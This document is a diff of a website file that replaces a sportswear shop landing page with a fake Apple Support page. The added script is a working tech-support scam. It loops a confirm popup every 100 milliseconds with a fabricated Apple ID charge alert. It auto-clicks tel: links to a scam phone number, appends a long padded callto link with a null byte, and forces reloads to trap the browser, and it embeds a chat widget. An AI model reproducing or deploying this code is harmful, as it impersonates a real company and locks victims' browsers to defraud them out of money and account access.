+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
             </ul>
-          </div>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
         </div>
-      </div>
-    </div>
-    <div class="section" id="about-us">
-      <div class="container">
-        <h2 class="title">Crafting Modern Apparel for Dedicated Athletes</h2>
-        <div class="content-box">
-          <div class="main-wrapper">
-            <img class="main-img" src="product-images/main-sportswear-display.webp" alt="Running sportswear and accessories neatly displayed on a wooden table" />
-          </div>
-          <div class="main-description">
-            <div><p>Clothing can either become an invisible second skin that supports every movement or a constant distraction that ruins a workout. Too many brands focus entirely on glossy marketing while ignoring how a seam rubs against the skin after forty minutes of running. <strong>Foxureulfa</strong> approaches sportswear from the ground up, focusing on the mechanical reality of human motion.</p><p>Athletes require gear that responds instantly to changes in temperature, sweat levels, and physical stress. When you pull on a training shirt or lace up in specialized athletic socks, you put absolute trust in the materials. That trust must be earned through careful engineering and honest manufacturing processes.</p><h2>The Science of Technical Fabrics</h2><p>Synthetic fibers have evolved far beyond the cheap polyester of the past. Modern technical textiles interact with perspiration by pulling moisture away from the epidermis through microscopic capillary channels. This process relies entirely on cross-section fiber geometry rather than chemical coatings that wash away after three trips through the laundry machine.</p><p>When a runner hits the pavement on a humid morning, heavy cotton absorbs water and clings to the torso like a wet blanket. <strong>Foxureulfa</strong> garments utilize engineered knit structures that encourage rapid evaporation. Air circulates freely through the mesh panels, keeping core body temperature stable even when the intensity climbs during interval training.</p><ul><li>High-density knitting prevents premature tearing at high-stress points.</li><li>Flatlock stitching eliminates skin irritation caused by traditional overlapping seams.</li><li>Four-way stretch threads accommodate deep squats and aggressive lunges.</li><li>Antimicrobial treatments neutralize odor-causing bacteria during long sessions.</li><li>UV-blocking weaves protect outdoor athletes from harsh solar radiation.</li><li>Lightweight shell fabrics offer wind resistance without trapping excessive heat.</li></ul><h2>Durability Under Real Conditions</h2><p>Gym equipment is punishing on clothing. Knurled barbell shafts shred inferior knits, while wooden benches leave stubborn scuff marks on loose shorts. Designing apparel for this environment requires choosing materials that resist abrasion without sacrificing flexibility or adding unnecessary weight to the garment.</p><p>Zippers fail, elastic bands lose their tension, and drawstrings fray long before the main fabric wears thin. Attention to these small details separates reliable training gear from disposable fashion items. Every component attached to a <strong>Foxureulfa</strong> garment undergoes cyclical testing in our workshop to verify that it survives repeated use in demanding athletic environments.</p><p>We reinforce high-wear zones using double-needle stitching and bartack reinforcements at pocket corners and waistband junctions. This construction method distributes stress evenly across the fabric rather than concentrating force on a single thread. The result is clothing that maintains its structural integrity season after season.</p><h2>Ergonomics and Cut Patterns</h2><p>A pattern designed for a mannequin will never feel right on a moving human body. Muscles expand, joints bend, and postures shift constantly during sports. Our pattern makers spend countless hours testing prototypes with active weightlifters, sprinters, and yoga instructors to identify where restriction happens.</p><p>Raglan sleeves allow the arms to reach overhead without pulling the hem upward. Gusseted crotches in our training pants prevent restriction during deep flexion movements. Every panel is angled to follow the natural lines of human anatomy, creating a clean silhouette that moves in harmony with the wearer.</p><p>Comfort directly influences focus. If an athlete spends half their workout adjusting a sliding waistband or scratching at an itchy label, concentration breaks down. By removing these minor annoyances, we let you direct all mental energy toward your performance.</p><h2>Sustainable Production Choices</h2><p>The apparel industry generates significant waste, and ignoring this reality is no longer acceptable for any responsible manufacturer. We limit surplus inventory by producing in controlled batches and utilizing digital cutting markers that minimize fabric scraps on the cutting table.</p><p>Packaging materials are selected with the same care as our textiles. Cardboard tags use recycled paper stock, and shipping mailers rely on biodegradable polymers or sturdy paper alternatives that break down safely in standard recycling streams. We believe that respecting your body should go hand in hand with respecting the environment around us.</p><p>Quality manufacturing requires patience, skilled labor, and an uncompromising attitude toward raw materials. By keeping our production standards high, we ensure that every piece leaving our facility provides the reliability you deserve when chasing your athletic goals.</p></div>
-          </div>
-        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-         
-      </div>
-    </div>
-    <div class="section solution" id="benefits">
-      <div class="container">
-        <ul class="solution-list">
-          <li class="solution-item">
-            <div class="fl-box">
-              <div class="wr-glr">
-                <div class="bg-box">
-                  <div class="solution-img-box">
-                    <img src="assets/images/fitness-apparel-rack.webp" alt="" />
-                  </div>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-959-1984 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-              </div>
-              <h3 class="subtitle">We utilize advanced moisture-wicking fabrics that keep your body dry during intense training sessions.</h3>
             </div>
-          </li>
-          <li class="solution-item">
-            <div class="fl-box">
-              <div class="wr-glr">
-                <div class="bg-box">
-                  <div class="solution-img-box">
-                    <img src="assets/images/athletic-accessories-flatlay.webp" alt="" />
-                  </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
                 </div>
-              </div>
-              <h3 class="subtitle">Every garment undergoes rigorous stress testing to ensure maximum durability under heavy loads.</h3>
             </div>
-          </li>
-          <li class="solution-item">
-            <div class="fl-box">
-              <div class="wr-glr">
-                <div class="bg-box">
-                  <div class="solution-img-box">
-                    <img src="assets/images/outdoor-training-gear.webp" alt="" />
-                  </div>
-                </div>
-              </div>
-              <h3 class="subtitle">Our ergonomic cut patterns eliminate friction and allow complete freedom of movement in any direction.</h3>
-            </div>
-          </li>
-        </ul>
-      </div>
-    </div>
-    <div class="section questions" id="questions">
-      <div class="container">
-        <h2 class="title">Frequently Asked Questions</h2>
-        <div class="row mb-3">
-          <ul class="questions-list">
-            <li class="col questions-items">
-              <img src="assets/images/breathable-fabric-icon.png" alt="" />
-              <p class="subtitle">What materials do you use in your apparel?</p>
-              <p>We source high-grade technical polyesters, elastane blends, and organic cottons specifically chosen for breathability, stretch recovery, and skin comfort during heavy physical exertion.</p>
-            </li>
-            <li class="col questions-items">
-              <img src="assets/images/durability-shield-icon.png" alt="" />
-              <p class="subtitle">How do I find my correct clothing size?</p>
-              <p>Check our detailed measurement chart located on every product page. Grab a flexible tape measure, take your bust, waist, and hip dimensions, and compare them against the listed numbers.</p>
-            </li>
-          </ul>
-        </div>
-        <div class="row">
-          <ul class="questions-list">
-            <li class="col questions-items">
-              <img src="assets/images/moisture-wicking-icon.png" alt="" />
-              <p class="subtitle">Can I return items if they do not fit?</p>
-              <p>Unworn items in original packaging with tags attached can be sent back within thirty days of delivery for a full exchange or a refund to your original payment method.</p>
-            </li>
-            <li class="col questions-items">
-              <img src="assets/images/lightweight-feather-icon.png" alt="" />
-              <p class="subtitle">Do you offer custom designs for sports teams?</p>
-              <p>Yes, we produce custom kits for clubs and schools. Send us your logo, color preferences, and required quantities through our contact form to get a personalized manufacturing quote.</p>
-            </li>
-          </ul>
-        </div>
-      </div>
-    </div>
-    <div class="d-flex flex-column">
-      <div class="section">
-        <div class="container">
-          
-          <div class="form-box">
-            <form class="contact-form" action="thank-you.php" method="post">
-              <h2 class="title">You can use our services by writing to us or calling us. We will be happy to answer any questions and help you order services!</h2>
-              <div class="contact-wrapper">
-                <input class="input-field-box--item" type="text" name="name-data-secondary" placeholder="Enter your name" required><input name="email-data-secondary" class="input-field-box--item" type="email" placeholder="Email Address" required>
-              </div>
-              <div>
-                <div class="form-check">
-                  <input
-                    class="form-check-input"
-                    type="checkbox"
-                    value=""
-                    id="flexCheckChecked"
-                  />
-                  <label class="form-check-label" for="flexCheckChecked">
-                    I accept <a href="Privacy.html" target="_blank">Privacy policy</a>
-                  </label>
-                </div>
-              </div>
-              <button class="button-4 contact-btn" type="submit">
-                <span>Specialist consultation</span>
-              </button>
-            </form>
-            
-            
-            <div class="form-box-reviews shippingnf__box">
-              <div class="review-wr">
-                <div class="review-img">
-                  <img src="assets/images/female-customer-avatar.webp" alt="" width="300" />
-                </div>
-                <div class="review-box">
-                  <div class="raiting justify-content-start">
-                    <div>✦</div>
-                    <div>✦</div>
-                    <div>✦</div>
-                    <div>✦</div>
-                    <div>✦</div>
-                  </div>
-                  <div>
-                    <p class="subtitle">Samantha Miller</p>
-                    <p>Finding leggings that stay in place during a heavy deadlift session used to be impossible until I tried Foxureulfa gear. The fabric thickness is just right and the waistband never rolls down.</p>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </div>
-        </div>
-      </div>
-      
-      <div class="section" id="gallery">
-        <div class="container">
-          <ul class="gallery-list discountog__panel">
-            <li class="gallery-item gallery-item-one">
-              <img src="assets/images/running-gear-display.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-second">
-              <img src="assets/images/fitness-apparel-rack.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-third">
-              <img src="assets/images/athletic-accessories-flatlay.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-four">
-              <img src="assets/images/outdoor-training-gear.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-five">
-              <img src="assets/images/gym-clothing-folding.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-six">
-              <img src="assets/images/sports-bag-essentials.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-seven">
-              <img src="assets/images/yoga-and-stretch-apparel.webp" alt="" />
-            </li>
-            <li class="gallery-item gallery-item-eight">
-              <img src="assets/images/team-sports-uniforms.webp" alt="" />
-            </li>
-          </ul>
-        </div>
-      </div>
-      
-    </div>
-    
-    <div class="section footer catalogph__section">
-      
-      <div class="footer-privacy-wrapper">
-        <a class="footer-privacy" href="Privacy.html" target="_blank">Privacy policy</a>
-        <a class="footer-privacy" href="terms.html" target="_blank">Terms & Conditions</a>
-        <a class="footer-privacy m-0" href="legal-disclaimer.html" target="_blank">Disclaimer</a>
-                
-      </div>
+        </section>
     </div>
 
-   
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-844-959-1984
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
     <script>
-      document.addEventListener('DOMContentLoaded', function() {
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
 
-    window.addEventListener('scroll', function() {
-        let currentScrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
 
-        if (currentScrollPosition >= 80) {
-            document.querySelector('.navbar').classList.add('nav-bg');
-        } else {
-            document.querySelector('.navbar').classList.remove('nav-bg');
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-844-959-1984');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
         }
-    });
-    });
 
-    document.addEventListener('DOMContentLoaded', function() {
-    const navbarToggler = document.querySelector('.navbar-toggler');
-    const navbarSupportedContent = document.getElementById('navbarSupportedContent');
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
 
-    navbarToggler.addEventListener('click', function() {
-        navbarSupportedContent.classList.toggle('show');
-    });
-    });
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-959-1984"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-844-959-1984 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
     </script>
 
-    
 
-    
-  </body>
-</html>
 
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
